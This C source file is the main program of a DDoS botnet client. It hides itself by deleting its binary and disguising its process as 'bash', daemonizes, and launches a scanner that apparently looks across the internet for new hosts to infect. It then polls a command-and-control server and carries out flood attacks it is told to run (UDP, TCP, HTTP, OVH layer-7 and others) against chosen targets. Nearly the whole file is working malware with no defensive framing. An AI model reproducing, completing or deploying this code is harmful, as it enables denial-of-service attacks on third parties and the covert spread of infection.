#include "includes/px_botnet.h"

in_addr_t addr;

void ft_manage_request(char *ptr)
{
	char **split;

	split = ft_split(ptr, '|');
	if (ft_split_len(split) == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "ADFVDJIUCJHEhguehdFUCDJuyhy", 27)) // if args of KILL commands is "ADFVDJIUCJHEhguehdFUCDJuyhy" the bot kill itself
		exit(0);
	if (!fork())
	{
		if (ft_split_len(split) >= 4)
		{
			if (!ft_strncmp(split[0], "OVHL7", 5) && ft_split_len(split) == 5)
				OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
			else if (!ft_strncmp(split[0], "PPS", 3) && ft_split_len(split) == 5)
				PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
			else if (!ft_strncmp(split[0], "HTTP", 4) && ft_split_len(split) == 7) // Already forked
				HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
			else if (!ft_strncmp(split[0], "UDPRAW", 6))
				UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
			else if (!ft_strncmp(split[0], "HOLD", 4))
				HOLD(split[1], atoi(split[2]), atoi(split[3]));
			else if (!ft_strncmp(split[0], "JUNK", 4))
				JUNK(split[1], atoi(split[2]), atoi(split[3]));
			else if (!ft_strncmp(split[0], "RANDHEX", 7))
				RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
			else if (!ft_strncmp(split[0], "STD", 3))
				STD(split[1], atoi(split[2]), atoi(split[3]));
			else if (!ft_strncmp(split[0], "UDP", 3) && ft_split_len(split) == 7)
				UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
			else if (!ft_strncmp(split[0], "TCP", 3) && ft_split_len(split) == 8)
				TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
			else if (!ft_strncmp(split[0], "XTDCUSTOM", 9))
				XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
		}
		ft_free_split(split);
		exit(0);
	}
}

int main(int argc, char *argv[])
{
	char name[] = "bash";
	pthread_t ip_searcher;
	char *id;
	char *request;
	char *tmp;
	char *arch;
	pid_t pid1;
	pid_t pid2;
	int status;

	if (!DEBUG)
	{
		remove(argv[0]);
		srand(time(NULL) ^ getpid());
		strncpy(argv[0], "bash", strlen("bash"));
		argv[0] = "bash";
		prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
	
		if (pid1 = fork())
		{
			waitpid(pid1, &status, 0);
			exit(0);
		}
		else if (!pid1)
			if (pid2 = fork())
				exit(0);
		setsid();
		chdir("/");
		signal(SIGPIPE, SIG_IGN);
	}
	addr = inet_addr("8.8.8.8");
	arch = ft_getarch();
	id = ft_get_id();
	char *uwu;
	uwu = ft_itoa(rand() % 100000);
	id = ft_strnjoin(id, "-", 1);
	id = ft_strnjoin(id, uwu, strlen(uwu));
	if (!fork())
	{
		ft_scan_world();
		exit(0);
	}
	free(uwu);
	request = ft_strjoin("?id=", id);
	request = ft_strnjoinf(url_page, request, strlen(request));
	request = ft_strnjoin(request, "&arch=", strlen(request));
	request = ft_strnjoin(request, arch, strlen(request));
	while (true)
	{
		tmp = ft_request(request);
		if (tmp)
		{
			ft_manage_request(tmp);
			free(tmp);
		}
		if (DEBUG)
			usleep(250000);
		else
			sleep(rand() % 10);
	}
	free(request);
	return (0);
}